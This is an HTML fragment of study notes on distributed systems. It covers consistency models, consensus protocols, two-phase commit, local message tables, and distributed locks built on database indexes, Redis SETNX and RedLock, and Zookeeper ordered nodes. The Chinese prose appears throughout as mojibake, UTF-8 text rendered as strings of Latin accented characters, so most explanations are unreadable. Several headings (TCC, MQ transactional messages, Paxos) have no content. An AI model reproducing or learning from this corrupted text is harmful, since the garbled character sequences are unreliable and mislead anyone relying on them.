<p>å¼ºä¸€è‡´æ€§ä¹Ÿç§°ä¸ºåŸå­ä¸€è‡´æ€§ã€çº¿æ€§ä¸€è‡´æ€§ã€‚å¼ºä¸€è‡´æ€§å¯ä»¥ç†è§£ä¸ºåœ¨ä»»æ„æ—¶åˆ»ï¼Œæ‰€æœ‰èŠ‚ç‚¹ä¸­çš„æ•°æ®æ˜¯ä¸€æ ·çš„ã€‚åŒä¸€æ—¶é—´ç‚¹ï¼Œä½ åœ¨èŠ‚ç‚¹Aä¸­è·å–åˆ°key1çš„å€¼ä¸åœ¨èŠ‚ç‚¹Bä¸­è·å–åˆ°key1çš„å€¼åº”è¯¥éƒ½æ˜¯ä¸€æ ·çš„ã€‚ä»»ä½•ä¸€æ¬¡è¯»éƒ½èƒ½è¯»åˆ°æŸä¸ªæ•°æ®çš„æœ€è¿‘ä¸€æ¬¡å†™çš„æ•°æ®ï¼Œç³»ç»Ÿä¸­çš„æ‰€æœ‰è¿›ç¨‹ï¼Œçœ‹åˆ°çš„æ“ä½œé¡ºåºï¼Œéƒ½å’Œå…¨å±€æ—¶é’Ÿä¸‹çš„é¡ºåºä¸€è‡´ã€‚</p>
<h4 id="ä¸»ä»åŒæ­¥" tabindex="-1"> ä¸»ä»åŒæ­¥</h4>
<p>åŸºæœ¬æ€æƒ³ï¼šä¸»ä»åŒæ­¥å¤åˆ¶ï¼š</p>
<ul>
<li>Master æ¥å—å†™è¯·æ±‚</li>
<li>Master å¤åˆ¶æ—¥å¿—è‡³slave</li>
<li>Master ç­‰å¾…ï¼Œç›´åˆ°æ‰€æœ‰ä»åº“è¿”å›</li>
</ul>
<p>å­˜åœ¨çš„é—®é¢˜:ä¸€ä¸ªèŠ‚ç‚¹å¤±è´¥ï¼ŒMasteré˜»å¡ï¼Œå¯¼è‡´æ•´é›†ç¾¤ä¸å¯ç”¨ï¼Œä¿è¯äº†ä¸€è‡´æ€§ï¼Œå¯ç”¨æ€§å¤§å¤§é™ä½</p>
<p>ç›¸å…³åè®®ï¼š</p>
<ul>
<li>2PC</li>
<li>3PC</li>
</ul>
<h4 id="å…±è¯†é€‰ä¸¾" tabindex="-1"> å…±è¯†é€‰ä¸¾</h4>
<p>åŸºæœ¬æ€æƒ³ï¼šæ¯æ¬¡å†™éƒ½ä¿è¯å†™å…¥å¤§äºN/2ä¸ªèŠ‚ç‚¹ï¼Œæ¯æ¬¡è¯»ä¿è¯ä»å¤§äºN/2ä¸ªèŠ‚ç‚¹ä¸­è¯»ã€‚</p>
<p>ç›¸å…³åè®®ï¼š</p>
<ul>
<li>Paxos</li>
<li>Raftï¼ˆmulti-paxosï¼‰</li>
<li>ZABï¼ˆmulti-paxosï¼‰</li>
</ul>
<h3 id="å¼±ä¸€è‡´æ€§" tabindex="-1"> å¼±ä¸€è‡´æ€§</h3>
<p>å¼±ä¸€è‡´æ€§åŒ…å«å¾ˆå¤šç§ä¸åŒçš„å®ç°ï¼Œç›®å‰åˆ†å¸ƒå¼ç³»ç»Ÿä¸­å¹¿æ³›å®ç°çš„æ˜¯æœ€ç»ˆä¸€è‡´æ€§ã€‚æœ€ç»ˆä¸€è‡´æ€§æ˜¯å¼±ä¸€è‡´æ€§çš„ä¸€ç§ç‰¹ä¾‹ï¼Œéšç€æ—¶é—´çš„è¿ç§»ï¼Œä¸åŒèŠ‚ç‚¹ä¸Šçš„åŒä¸€ä»½æ•°æ®æ€»æ˜¯åœ¨å‘è¶‹åŒçš„æ–¹å‘å˜åŒ–ï¼Œä¿è¯ç”¨æˆ·æœ€ç»ˆèƒ½å¤Ÿè¯»å–åˆ°æŸæ“ä½œå¯¹ç³»ç»Ÿç‰¹å®šæ•°æ®çš„æ›´æ–°ã€‚ä¹Ÿå¯ä»¥ç®€å•çš„ç†è§£ä¸ºåœ¨ä¸€æ®µæ—¶é—´åï¼ŒèŠ‚ç‚¹é—´çš„æ•°æ®ä¼šæœ€ç»ˆè¾¾åˆ°ä¸€è‡´çŠ¶æ€ã€‚</p>
<p>æœ€ç»ˆä¸€è‡´æ€§æ ¹æ®æ›´æ–°æ•°æ®åå„è¿›ç¨‹è®¿é—®åˆ°æ•°æ®çš„æ—¶é—´å’Œæ–¹å¼çš„ä¸åŒï¼Œåˆå¯ä»¥åŒºåˆ†ä¸ºï¼š</p>
<ol>
<li>å› æœä¸€è‡´æ€§ï¼šå¦‚æœè¿›ç¨‹Aé€šçŸ¥è¿›ç¨‹Bå®ƒå·²æ›´æ–°äº†ä¸€ä¸ªæ•°æ®é¡¹ï¼Œé‚£ä¹ˆè¿›ç¨‹Bçš„åç»­è®¿é—®å°†è¿”å›æ›´æ–°åçš„å€¼ï¼Œä¸”ä¸€æ¬¡å†™å…¥å°†ä¿è¯å–ä»£å‰ä¸€æ¬¡å†™å…¥ã€‚ä¸è¿›ç¨‹Aæ— å› æœå…³ç³»çš„è¿›ç¨‹Cçš„è®¿é—®éµå®ˆä¸€èˆ¬çš„æœ€ç»ˆä¸€è‡´æ€§è§„åˆ™ã€‚</li>
<li>è¯»å·±ä¹‹æ‰€å†™ä¸€è‡´æ€§ï¼šå½“è¿›ç¨‹Aè‡ªå·±æ›´æ–°ä¸€ä¸ªæ•°æ®é¡¹ä¹‹åï¼Œå®ƒæ€»æ˜¯è®¿é—®åˆ°æ›´æ–°è¿‡çš„å€¼ï¼Œç»ä¸ä¼šçœ‹åˆ°æ—§å€¼ã€‚è¿™æ˜¯å› æœä¸€è‡´æ€§æ¨¡å‹çš„ä¸€ä¸ªç‰¹ä¾‹ã€‚</li>
<li>ä¼šè¯ä¸€è‡´æ€§ï¼šè¿™æ˜¯ä¸Šä¸€ä¸ªæ¨¡å‹çš„å®ç”¨ç‰ˆæœ¬ï¼Œå®ƒæŠŠè®¿é—®å­˜å‚¨ç³»ç»Ÿçš„è¿›ç¨‹æ”¾åˆ°ä¼šè¯çš„ä¸Šä¸‹æ–‡ä¸­ã€‚åªè¦ä¼šè¯è¿˜å­˜åœ¨ï¼Œç³»ç»Ÿå°±ä¿è¯â€œè¯»å·±ä¹‹æ‰€å†™â€ä¸€è‡´æ€§ã€‚å¦‚æœç”±äºæŸäº›å¤±è´¥æƒ…å½¢ä»¤ä¼šè¯ç»ˆæ­¢ï¼Œå°±è¦å»ºç«‹æ–°çš„ä¼šè¯ï¼Œè€Œä¸”ç³»ç»Ÿçš„ä¿è¯ä¸ä¼šå»¶ç»­åˆ°æ–°çš„ä¼šè¯ã€‚</li>
<li>å•è°ƒè¯»ä¸€è‡´æ€§ï¼šå¦‚æœè¿›ç¨‹å·²ç»çœ‹åˆ°è¿‡æ•°æ®å¯¹è±¡çš„æŸä¸ªå€¼ï¼Œé‚£ä¹ˆä»»ä½•åç»­è®¿é—®éƒ½ä¸ä¼šè¿”å›åœ¨é‚£ä¸ªå€¼ä¹‹å‰çš„å€¼ã€‚</li>
<li>å•è°ƒå†™ä¸€è‡´æ€§ï¼šç³»ç»Ÿä¿è¯æ¥è‡ªåŒä¸€ä¸ªè¿›ç¨‹çš„å†™æ“ä½œé¡ºåºæ‰§è¡Œã€‚è¦æ˜¯ç³»ç»Ÿä¸èƒ½ä¿è¯è¿™ç§ç¨‹åº¦çš„ä¸€è‡´æ€§ï¼Œå°±éå¸¸éš¾ä»¥ç¼–ç¨‹äº†ã€‚</li>
</ol>
<p>ç›¸å…³åè®®ï¼šGossipï¼ˆCassandraã€Redisçš„é€šä¿¡åè®®ï¼‰</p>
<h2 id="ä¸€è‡´æ€§åè®®" tabindex="-1"> ä¸€è‡´æ€§åè®®</h2>
<p>ä¸ºäº†å®ç°ä¸€è‡´æ€§æ¨¡å‹çš„çº¦æŸï¼Œéœ€è¦é€šè¿‡ä¸€è‡´æ€§åè®®æ¥ä¿è¯ã€‚ä¸€è‡´æ€§åè®®æ ¹æ®æ˜¯å¦å…è®¸æ•°æ®åˆ†æ­§å¯ä»¥åˆ†ä¸ºä¸¤ç§ï¼š</p>
<ul>
<li>å•ä¸»åè®®ï¼ˆä¸å…è®¸æ•°æ®åˆ†æ­§ï¼‰ï¼šæ•´ä¸ªåˆ†å¸ƒå¼ç³»ç»Ÿå°±åƒä¸€ä¸ªå•ä½“ç³»ç»Ÿï¼Œæ‰€æœ‰å†™æ“ä½œéƒ½ç”±ä¸»èŠ‚ç‚¹å¤„ç†å¹¶ä¸”åŒæ­¥ç»™å…¶ä»–å‰¯æœ¬ã€‚ä¾‹å¦‚2PCã€3PCã€Paxosç­‰</li>
<li>å¤šä¸»åè®®ï¼ˆå…è®¸æ•°æ®åˆ†æ­§ï¼‰ï¼šæ‰€æœ‰å†™æ“ä½œå¯ä»¥ç”±ä¸åŒèŠ‚ç‚¹å‘èµ·ï¼Œå¹¶ä¸”åŒæ­¥ç»™å…¶ä»–å‰¯æœ¬ã€‚ä¾‹å¦‚ Gossipã€POWã€‚ç”±äºå¤šä¸»åè®®ä¸€èˆ¬æä¾›çš„éƒ½æ˜¯æœ€ç»ˆä¸€è‡´æ€§ï¼Œæ‰€ä»¥å¸¸ç”¨åœ¨å¯¹æ•°æ®ä¸€è‡´æ€§è¦æ±‚ä¸é«˜çš„åœºæ™¯ä¸­ã€‚</li>
</ul>
<h1 id="åˆ†å¸ƒå¼äº‹åŠ¡" tabindex="-1"> åˆ†å¸ƒå¼äº‹åŠ¡</h1>
<p>åˆ†å¸ƒå¼äº‹åŠ¡å°±æ˜¯æŒ‡äº‹åŠ¡çš„å‚ä¸è€…ã€æ”¯æŒäº‹åŠ¡çš„æœåŠ¡å™¨ã€èµ„æºæœåŠ¡å™¨ä»¥åŠäº‹åŠ¡ç®¡ç†å™¨åˆ†åˆ«ä½äºä¸åŒçš„åˆ†å¸ƒå¼ç³»ç»Ÿçš„ä¸åŒèŠ‚ç‚¹ä¹‹ä¸Šã€‚</p>
<p>æŒ‡äº‹åŠ¡çš„æ“ä½œä½äºä¸åŒçš„èŠ‚ç‚¹ä¸Šï¼Œéœ€è¦ä¿è¯äº‹åŠ¡çš„ ACID ç‰¹æ€§ã€‚</p>
<p>åˆ†å¸ƒå¼äº‹åŠ¡å°±æ˜¯ä¸ºäº†ä¿è¯ä¸åŒæ•°æ®åº“çš„æ•°æ®ä¸€è‡´æ€§ã€‚</p>
<p>ä¾‹å¦‚åœ¨ä¸‹å•åœºæ™¯ä¸‹ï¼Œåº“å­˜å’Œè®¢å•å¦‚æœä¸åœ¨åŒä¸€ä¸ªèŠ‚ç‚¹ä¸Šï¼Œå°±æ¶‰åŠåˆ†å¸ƒå¼äº‹åŠ¡ã€‚</p>
<p><a href="https://www.jianshu.com/p/1156151e20c8" target="_blank" rel="noopener noreferrer">åˆ†å¸ƒå¼æœåŠ¡åŒ–ç³»ç»Ÿä¸€è‡´æ€§çš„â€œæœ€ä½³å®å¹²â€</a></p>
<h2 id="åˆ†å¸ƒå¼äº‹åŠ¡äº§ç”ŸåŸå› " tabindex="-1"> åˆ†å¸ƒå¼äº‹åŠ¡äº§ç”ŸåŸå› </h2>
<ul>
<li>æ•°æ®åº“åˆ†åº“åˆ†è¡¨</li>
<li>åº”ç”¨SOAåŒ–</li>
</ul>
<h2 id="è§£å†³æ–¹æ¡ˆ" tabindex="-1"> è§£å†³æ–¹æ¡ˆ</h2>
<h3 id="ä¸¤é˜¶æ®µæäº¤-2pc" tabindex="-1"> ä¸¤é˜¶æ®µæäº¤ï¼ˆ2PCï¼‰</h3>
<p>ä¸¤é˜¶æ®µæäº¤ï¼ˆTwo-phase Commitï¼Œ2PCï¼‰ï¼Œé€šè¿‡å¼•å…¥åè°ƒè€…ï¼ˆCoordinatorï¼‰æ¥åè°ƒå‚ä¸è€…çš„è¡Œä¸ºï¼Œå¹¶æœ€ç»ˆå†³å®šè¿™äº›å‚ä¸è€…æ˜¯å¦è¦çœŸæ­£æ‰§è¡Œäº‹åŠ¡ã€‚</p>
<h4 id="_1-è¿è¡Œè¿‡ç¨‹" tabindex="-1"> 1. è¿è¡Œè¿‡ç¨‹</h4>
<h5>1.1 å‡†å¤‡é˜¶æ®µ</h5>
<p>åè°ƒè€…è¯¢é—®å‚ä¸è€…äº‹åŠ¡æ˜¯å¦æ‰§è¡ŒæˆåŠŸï¼Œå‚ä¸è€…å‘å›äº‹åŠ¡æ‰§è¡Œç»“æœã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/44d33643-1004-43a3-b99a-4d688a08d0a1.png" width="550px"> </div><br>
<h5>1.2 æäº¤é˜¶æ®µ</h5>
<p>å¦‚æœäº‹åŠ¡åœ¨æ¯ä¸ªå‚ä¸è€…ä¸Šéƒ½æ‰§è¡ŒæˆåŠŸï¼Œäº‹åŠ¡åè°ƒè€…å‘é€é€šçŸ¥è®©å‚ä¸è€…æäº¤äº‹åŠ¡ï¼›å¦åˆ™ï¼Œåè°ƒè€…å‘é€é€šçŸ¥è®©å‚ä¸è€…å›æ»šäº‹åŠ¡ã€‚</p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨å‡†å¤‡é˜¶æ®µï¼Œå‚ä¸è€…æ‰§è¡Œäº†äº‹åŠ¡ï¼Œä½†æ˜¯è¿˜æœªæäº¤ã€‚åªæœ‰åœ¨æäº¤é˜¶æ®µæ¥æ”¶åˆ°åè°ƒè€…å‘æ¥çš„é€šçŸ¥åï¼Œæ‰è¿›è¡Œæäº¤æˆ–è€…å›æ»šã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/d2ae9932-e2b1-4191-8ee9-e573f36d3895.png" width="550px"> </div><br>
<h4 id="_2-å­˜åœ¨çš„é—®é¢˜" tabindex="-1"> 2. å­˜åœ¨çš„é—®é¢˜</h4>
<h5>2.1 åŒæ­¥é˜»å¡</h5>
<p>æ‰€æœ‰äº‹åŠ¡å‚ä¸è€…åœ¨ç­‰å¾…å…¶å®ƒå‚ä¸è€…å“åº”çš„æ—¶å€™éƒ½å¤„äºåŒæ­¥é˜»å¡çŠ¶æ€ï¼Œæ— æ³•è¿›è¡Œå…¶å®ƒæ“ä½œã€‚</p>
<h5>2.2 å•ç‚¹é—®é¢˜</h5>
<p>åè°ƒè€…åœ¨ 2PC ä¸­èµ·åˆ°éå¸¸å¤§çš„ä½œç”¨ï¼Œå‘ç”Ÿæ•…éšœå°†ä¼šé€ æˆå¾ˆå¤§å½±å“ã€‚ç‰¹åˆ«æ˜¯åœ¨é˜¶æ®µäºŒå‘ç”Ÿæ•…éšœï¼Œæ‰€æœ‰å‚ä¸è€…ä¼šä¸€ç›´ç­‰å¾…ï¼Œæ— æ³•å®Œæˆå…¶å®ƒæ“ä½œã€‚</p>
<h5>2.3 æ•°æ®ä¸ä¸€è‡´</h5>
<p>åœ¨é˜¶æ®µäºŒï¼Œå¦‚æœåè°ƒè€…åªå‘é€äº†éƒ¨åˆ† Commit æ¶ˆæ¯ï¼Œæ­¤æ—¶ç½‘ç»œå‘ç”Ÿå¼‚å¸¸ï¼Œé‚£ä¹ˆåªæœ‰éƒ¨åˆ†å‚ä¸è€…æ¥æ”¶åˆ° Commit æ¶ˆæ¯ï¼Œä¹Ÿå°±æ˜¯è¯´åªæœ‰éƒ¨åˆ†å‚ä¸è€…æäº¤äº†äº‹åŠ¡ï¼Œä½¿å¾—ç³»ç»Ÿæ•°æ®ä¸ä¸€è‡´ã€‚</p>
<h5>2.4 å¤ªè¿‡ä¿å®ˆ</h5>
<p>ä»»æ„ä¸€ä¸ªèŠ‚ç‚¹å¤±è´¥å°±ä¼šå¯¼è‡´æ•´ä¸ªäº‹åŠ¡å¤±è´¥ï¼Œæ²¡æœ‰å®Œå–„çš„å®¹é”™æœºåˆ¶ã€‚</p>
<h3 id="æœ¬åœ°æ¶ˆæ¯è¡¨-å¼‚æ­¥ç¡®ä¿" tabindex="-1"> æœ¬åœ°æ¶ˆæ¯è¡¨(å¼‚æ­¥ç¡®ä¿)</h3>
<p>æœ¬åœ°æ¶ˆæ¯è¡¨ä¸ä¸šåŠ¡æ•°æ®è¡¨å¤„äºåŒä¸€ä¸ªæ•°æ®åº“ä¸­ï¼Œè¿™æ ·å°±èƒ½åˆ©ç”¨æœ¬åœ°äº‹åŠ¡æ¥ä¿è¯åœ¨å¯¹è¿™ä¸¤ä¸ªè¡¨çš„æ“ä½œæ»¡è¶³äº‹åŠ¡ç‰¹æ€§ï¼Œå¹¶ä¸”ä½¿ç”¨äº†æ¶ˆæ¯é˜Ÿåˆ—æ¥ä¿è¯æœ€ç»ˆä¸€è‡´æ€§ã€‚</p>
<ol>
<li>åœ¨åˆ†å¸ƒå¼äº‹åŠ¡æ“ä½œçš„ä¸€æ–¹å®Œæˆå†™ä¸šåŠ¡æ•°æ®çš„æ“ä½œä¹‹åå‘æœ¬åœ°æ¶ˆæ¯è¡¨å‘é€ä¸€ä¸ªæ¶ˆæ¯ï¼Œæœ¬åœ°äº‹åŠ¡èƒ½ä¿è¯è¿™ä¸ªæ¶ˆæ¯ä¸€å®šä¼šè¢«å†™å…¥æœ¬åœ°æ¶ˆæ¯è¡¨ä¸­ã€‚</li>
<li>ä¹‹åå°†æœ¬åœ°æ¶ˆæ¯è¡¨ä¸­çš„æ¶ˆæ¯è½¬å‘åˆ°æ¶ˆæ¯é˜Ÿåˆ—ä¸­ï¼Œå¦‚æœè½¬å‘æˆåŠŸåˆ™å°†æ¶ˆæ¯ä»æœ¬åœ°æ¶ˆæ¯è¡¨ä¸­åˆ é™¤ï¼Œå¦åˆ™ç»§ç»­é‡æ–°è½¬å‘ã€‚</li>
<li>åœ¨åˆ†å¸ƒå¼äº‹åŠ¡æ“ä½œçš„å¦ä¸€æ–¹ä»æ¶ˆæ¯é˜Ÿåˆ—ä¸­è¯»å–ä¸€ä¸ªæ¶ˆæ¯ï¼Œå¹¶æ‰§è¡Œæ¶ˆæ¯ä¸­çš„æ“ä½œã€‚</li>
</ol>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/476329d4-e2ef-4f7b-8ac9-a52a6f784600.png" width="740px"> </div><br>
<h3 id="è¡¥å¿äº‹åŠ¡-tcc" tabindex="-1"> è¡¥å¿äº‹åŠ¡(TCC)</h3>
<h3 id="mq-äº‹åŠ¡æ¶ˆæ¯" tabindex="-1"> MQ äº‹åŠ¡æ¶ˆæ¯</h3>
<h1 id="åˆ†å¸ƒå¼é”" tabindex="-1"> åˆ†å¸ƒå¼é”</h1>
<p>åœ¨å•æœºåœºæ™¯ä¸‹ï¼Œå¯ä»¥ä½¿ç”¨è¯­è¨€çš„å†…ç½®é”æ¥å®ç°è¿›ç¨‹åŒæ­¥ã€‚ä½†æ˜¯åœ¨åˆ†å¸ƒå¼åœºæ™¯ä¸‹ï¼Œéœ€è¦åŒæ­¥çš„è¿›ç¨‹å¯èƒ½ä½äºä¸åŒçš„èŠ‚ç‚¹ä¸Šï¼Œé‚£ä¹ˆå°±éœ€è¦ä½¿ç”¨åˆ†å¸ƒå¼é”ã€‚</p>
<p>é˜»å¡é”é€šå¸¸ä½¿ç”¨äº’æ–¥é‡æ¥å®ç°ï¼š</p>
<ul>
<li>äº’æ–¥é‡ä¸º 0 è¡¨ç¤ºæœ‰å…¶å®ƒè¿›ç¨‹åœ¨ä½¿ç”¨é”ï¼Œæ­¤æ—¶å¤„äºé”å®šçŠ¶æ€ï¼›</li>
<li>äº’æ–¥é‡ä¸º 1 è¡¨ç¤ºæœªé”å®šçŠ¶æ€ã€‚</li>
</ul>
<p>1 å’Œ 0 å¯ä»¥ç”¨ä¸€ä¸ªæ•´å‹å€¼è¡¨ç¤ºï¼Œä¹Ÿå¯ä»¥ç”¨æŸä¸ªæ•°æ®æ˜¯å¦å­˜åœ¨è¡¨ç¤ºã€‚</p>
<h2 id="æ•°æ®åº“çš„å”¯ä¸€ç´¢å¼•" tabindex="-1"> æ•°æ®åº“çš„å”¯ä¸€ç´¢å¼•</h2>
<p>è·å¾—é”æ—¶å‘è¡¨ä¸­æ’å…¥ä¸€æ¡è®°å½•ï¼Œé‡Šæ”¾é”æ—¶åˆ é™¤è¿™æ¡è®°å½•ã€‚å”¯ä¸€ç´¢å¼•å¯ä»¥ä¿è¯è¯¥è®°å½•åªè¢«æ’å…¥ä¸€æ¬¡ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç”¨è¿™ä¸ªè®°å½•æ˜¯å¦å­˜åœ¨æ¥åˆ¤æ–­æ˜¯å¦å­˜äºé”å®šçŠ¶æ€ã€‚</p>
<p>å­˜åœ¨ä»¥ä¸‹å‡ ä¸ªé—®é¢˜ï¼š</p>
<ul>
<li>é”æ²¡æœ‰å¤±æ•ˆæ—¶é—´ï¼Œè§£é”å¤±è´¥çš„è¯å…¶å®ƒè¿›ç¨‹æ— æ³•å†è·å¾—è¯¥é”ã€‚</li>
<li>åªèƒ½æ˜¯éé˜»å¡é”ï¼Œæ’å…¥å¤±è´¥ç›´æ¥å°±æŠ¥é”™äº†ï¼Œæ— æ³•é‡è¯•ã€‚</li>
<li>ä¸å¯é‡å…¥ï¼Œå·²ç»è·å¾—é”çš„è¿›ç¨‹ä¹Ÿå¿…é¡»é‡æ–°è·å–é”ã€‚</li>
</ul>
<h2 id="redis-çš„-setnx-æŒ‡ä»¤" tabindex="-1"> Redis çš„ SETNX æŒ‡ä»¤</h2>
<p>ä½¿ç”¨ SETNXï¼ˆset if not existï¼‰æŒ‡ä»¤æ’å…¥ä¸€ä¸ªé”®å€¼å¯¹ï¼Œå¦‚æœ Key å·²ç»å­˜åœ¨ï¼Œé‚£ä¹ˆä¼šè¿”å› Falseï¼Œå¦åˆ™æ’å…¥æˆåŠŸå¹¶è¿”å› Trueã€‚</p>
<p>SETNX æŒ‡ä»¤å’Œæ•°æ®åº“çš„å”¯ä¸€ç´¢å¼•ç±»ä¼¼ï¼Œä¿è¯äº†åªå­˜åœ¨ä¸€ä¸ª Key çš„é”®å€¼å¯¹ï¼Œé‚£ä¹ˆå¯ä»¥ç”¨ä¸€ä¸ª Key çš„é”®å€¼å¯¹æ˜¯å¦å­˜åœ¨æ¥åˆ¤æ–­æ˜¯å¦å­˜äºé”å®šçŠ¶æ€ã€‚</p>
<p>EXPIRE æŒ‡ä»¤å¯ä»¥ä¸ºä¸€ä¸ªé”®å€¼å¯¹è®¾ç½®ä¸€ä¸ªè¿‡æœŸæ—¶é—´ï¼Œä»è€Œé¿å…äº†æ•°æ®åº“å”¯ä¸€ç´¢å¼•å®ç°æ–¹å¼ä¸­é‡Šæ”¾é”å¤±è´¥çš„é—®é¢˜ã€‚</p>
<h2 id="redis-çš„-redlock-ç®—æ³•" tabindex="-1"> Redis çš„ RedLock ç®—æ³•</h2>
<p>ä½¿ç”¨äº†å¤šä¸ª Redis å®ä¾‹æ¥å®ç°åˆ†å¸ƒå¼é”ï¼Œè¿™æ˜¯ä¸ºäº†ä¿è¯åœ¨å‘ç”Ÿå•ç‚¹æ•…éšœæ—¶ä»ç„¶å¯ç”¨ã€‚</p>
<ul>
<li>å°è¯•ä» N ä¸ªäº’ç›¸ç‹¬ç«‹ Redis å®ä¾‹è·å–é”ï¼›</li>
<li>è®¡ç®—è·å–é”æ¶ˆè€—çš„æ—¶é—´ï¼Œåªæœ‰å½“è¿™ä¸ªæ—¶é—´å°äºé”çš„è¿‡æœŸæ—¶é—´ï¼Œå¹¶ä¸”ä»å¤§å¤šæ•°ï¼ˆN / 2 + 1ï¼‰å®ä¾‹ä¸Šè·å–äº†é”ï¼Œé‚£ä¹ˆå°±è®¤ä¸ºé”è·å–æˆåŠŸäº†ï¼›</li>
<li>å¦‚æœé”è·å–å¤±è´¥ï¼Œå°±åˆ°æ¯ä¸ªå®ä¾‹ä¸Šé‡Šæ”¾é”ã€‚</li>
</ul>
<h2 id="zookeeper-çš„æœ‰åºèŠ‚ç‚¹" tabindex="-1"> Zookeeper çš„æœ‰åºèŠ‚ç‚¹</h2>
<h3 id="_1-zookeeper-æŠ½è±¡æ¨¡å‹" tabindex="-1"> 1. Zookeeper æŠ½è±¡æ¨¡å‹</h3>
<p>Zookeeper æä¾›äº†ä¸€ç§æ ‘å½¢ç»“æ„çš„å‘½åç©ºé—´ï¼Œ/app1/p_1 èŠ‚ç‚¹çš„çˆ¶èŠ‚ç‚¹ä¸º /app1ã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/aefa8042-15fa-4e8b-9f50-20b282a2c624.png" width="320px"> </div><br>
<h3 id="_2-èŠ‚ç‚¹ç±»å‹" tabindex="-1"> 2. èŠ‚ç‚¹ç±»å‹</h3>
<ul>
<li>æ°¸ä¹…èŠ‚ç‚¹ï¼šä¸ä¼šå› ä¸ºä¼šè¯ç»“æŸæˆ–è€…è¶…æ—¶è€Œæ¶ˆå¤±ï¼›</li>
<li>ä¸´æ—¶èŠ‚ç‚¹ï¼šå¦‚æœä¼šè¯ç»“æŸæˆ–è€…è¶…æ—¶å°±ä¼šæ¶ˆå¤±ï¼›</li>
<li>æœ‰åºèŠ‚ç‚¹ï¼šä¼šåœ¨èŠ‚ç‚¹åçš„åé¢åŠ ä¸€ä¸ªæ•°å­—åç¼€ï¼Œå¹¶ä¸”æ˜¯æœ‰åºçš„ï¼Œä¾‹å¦‚ç”Ÿæˆçš„æœ‰åºèŠ‚ç‚¹ä¸º /lock/node-0000000000ï¼Œå®ƒçš„ä¸‹ä¸€ä¸ªæœ‰åºèŠ‚ç‚¹åˆ™ä¸º /lock/node-0000000001ï¼Œä»¥æ­¤ç±»æ¨ã€‚</li>
</ul>
<h3 id="_3-ç›‘å¬å™¨" tabindex="-1"> 3. ç›‘å¬å™¨</h3>
<p>ä¸ºä¸€ä¸ªèŠ‚ç‚¹æ³¨å†Œç›‘å¬å™¨ï¼Œåœ¨èŠ‚ç‚¹çŠ¶æ€å‘ç”Ÿæ”¹å˜æ—¶ï¼Œä¼šç»™å®¢æˆ·ç«¯å‘é€æ¶ˆæ¯ã€‚</p>
<h3 id="_4-åˆ†å¸ƒå¼é”å®ç°" tabindex="-1"> 4. åˆ†å¸ƒå¼é”å®ç°</h3>
<ul>
<li>åˆ›å»ºä¸€ä¸ªé”ç›®å½• /lockï¼›</li>
<li>å½“ä¸€ä¸ªå®¢æˆ·ç«¯éœ€è¦è·å–é”æ—¶ï¼Œåœ¨ /lock ä¸‹åˆ›å»ºä¸´æ—¶çš„ä¸”æœ‰åºçš„å­èŠ‚ç‚¹ï¼›</li>
<li>å®¢æˆ·ç«¯è·å– /lock ä¸‹çš„å­èŠ‚ç‚¹åˆ—è¡¨ï¼Œåˆ¤æ–­è‡ªå·±åˆ›å»ºçš„å­èŠ‚ç‚¹æ˜¯å¦ä¸ºå½“å‰å­èŠ‚ç‚¹åˆ—è¡¨ä¸­åºå·æœ€å°çš„å­èŠ‚ç‚¹ï¼Œå¦‚æœæ˜¯åˆ™è®¤ä¸ºè·å¾—é”ï¼›å¦åˆ™ç›‘å¬è‡ªå·±çš„å‰ä¸€ä¸ªå­èŠ‚ç‚¹ï¼Œè·å¾—å­èŠ‚ç‚¹çš„å˜æ›´é€šçŸ¥åé‡å¤æ­¤æ­¥éª¤ç›´è‡³è·å¾—é”ï¼›</li>
<li>æ‰§è¡Œä¸šåŠ¡ä»£ç ï¼Œå®Œæˆåï¼Œåˆ é™¤å¯¹åº”çš„å­èŠ‚ç‚¹ã€‚</li>
</ul>
<h3 id="_5-ä¼šè¯è¶…æ—¶" tabindex="-1"> 5. ä¼šè¯è¶…æ—¶</h3>
<p>å¦‚æœä¸€ä¸ªå·²ç»è·å¾—é”çš„ä¼šè¯è¶…æ—¶äº†ï¼Œå› ä¸ºåˆ›å»ºçš„æ˜¯ä¸´æ—¶èŠ‚ç‚¹ï¼Œæ‰€ä»¥è¯¥ä¼šè¯å¯¹åº”çš„ä¸´æ—¶èŠ‚ç‚¹ä¼šè¢«åˆ é™¤ï¼Œå…¶å®ƒä¼šè¯å°±å¯ä»¥è·å¾—é”äº†ã€‚å¯ä»¥çœ‹åˆ°ï¼ŒZookeeper åˆ†å¸ƒå¼é”ä¸ä¼šå‡ºç°æ•°æ®åº“çš„å”¯ä¸€ç´¢å¼•å®ç°çš„åˆ†å¸ƒå¼é”é‡Šæ”¾é”å¤±è´¥é—®é¢˜ã€‚</p>
<h3 id="_6-ç¾Šç¾¤æ•ˆåº”" tabindex="-1"> 6. ç¾Šç¾¤æ•ˆåº”</h3>
<p>ä¸€ä¸ªèŠ‚ç‚¹æœªè·å¾—é”ï¼Œåªéœ€è¦ç›‘å¬è‡ªå·±çš„å‰ä¸€ä¸ªå­èŠ‚ç‚¹ï¼Œè¿™æ˜¯å› ä¸ºå¦‚æœç›‘å¬æ‰€æœ‰çš„å­èŠ‚ç‚¹ï¼Œé‚£ä¹ˆä»»æ„ä¸€ä¸ªå­èŠ‚ç‚¹çŠ¶æ€æ”¹å˜ï¼Œå…¶å®ƒæ‰€æœ‰å­èŠ‚ç‚¹éƒ½ä¼šæ”¶åˆ°é€šçŸ¥ï¼ˆç¾Šç¾¤æ•ˆåº”ï¼‰ï¼Œè€Œæˆ‘ä»¬åªå¸Œæœ›å®ƒçš„åä¸€ä¸ªå­èŠ‚ç‚¹æ”¶åˆ°é€šçŸ¥ã€‚</p>
<h1 id="ä¸€è‡´æ€§åè®®-ç®—æ³•" tabindex="-1"> ä¸€è‡´æ€§åè®®/ç®—æ³•</h1>
<h2 id="paxos" tabindex="-1"> Paxos</h2>
